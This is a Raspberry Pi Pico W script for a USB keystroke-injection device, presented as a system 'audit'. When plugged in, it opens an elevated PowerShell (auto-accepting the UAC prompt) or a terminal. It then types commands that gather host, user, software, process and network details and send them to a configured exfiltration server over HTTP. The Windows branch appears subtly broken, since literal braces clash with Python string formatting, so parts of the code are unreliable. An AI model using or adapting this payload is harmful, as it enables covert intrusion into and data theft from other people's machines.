# Raspberry Pi Pico W — Wireless SysAudit HID + WiFi Exfil (MicroPython)
# Detects Windows/macOS/Linux, injects appropriate audit command, exfils results
#
# CONFIGURE BEFORE UPLOADING:
WIFI_SSID      = "YourWiFiSSID"
WIFI_PASSWORD  = "YourWiFiPassword"
EXFIL_HOST     = "192.168.1.100"
EXFIL_PORT     = 8080
TARGET_OS      = "windows"       # "windows", "macos", or "linux"
AUDIT_DELAY_MS = 90000           # Time to wait for audit to complete (90s)

import time, network, usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

kbd    = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)

def press(*keys):
    kbd.press(*keys); time.sleep(0.05); kbd.release_all(); time.sleep(0.1)

def write(s):
    layout.write(s); time.sleep(0.05)

wlan = network.WLAN(network.STA_IF)
wlan.active(True)
wlan.connect(WIFI_SSID, WIFI_PASSWORD)

time.sleep(2.0)  # let host USB enumerate

if TARGET_OS == "windows":
    press(Keycode.GUI, Keycode.R); time.sleep(0.6)
    write("powershell"); press(Keycode.CONTROL, Keycode.SHIFT, Keycode.ENTER)
    time.sleep(1.5)
    press(Keycode.ALT, Keycode.Y); time.sleep(1.0)
    write("$o=@{H=hostname;U=$env:USERNAME;OS=(gwmi Win32_OS).Caption;SW=(gwmi Win32_Product|select Name,Version);Proc=(Get-Process|select Name,Id);Net=(ipconfig /all)};$o|ConvertTo-Json|Out-File $env:TEMP\\sa.json; Invoke-RestMethod -Uri 'http://{}:{}/upload' -Method POST -InFile $env:TEMP\\sa.json".format(EXFIL_HOST, EXFIL_PORT))
    press(Keycode.ENTER)

elif TARGET_OS == "macos":
    press(Keycode.GUI, Keycode.SPACE); time.sleep(0.8)
    write("Terminal"); press(Keycode.ENTER); time.sleep(1.5)
    write("curl -s -X POST http://{}:{}/upload -d \"$(system_profiler SPSoftwareDataType SPHardwareDataType SPNetworkDataType 2>/dev/null | base64)\"".format(EXFIL_HOST, EXFIL_PORT))
    press(Keycode.ENTER)

elif TARGET_OS == "linux":
    press(Keycode.CONTROL, Keycode.ALT, Keycode.T); time.sleep(1.5)
    write("curl -s -X POST http://{}:{}/upload -d \"$(uname -a; id; ip addr; ps aux | base64)\"".format(EXFIL_HOST, EXFIL_PORT))
    press(Keycode.ENTER)

time.sleep(AUDIT_DELAY_MS / 1000)
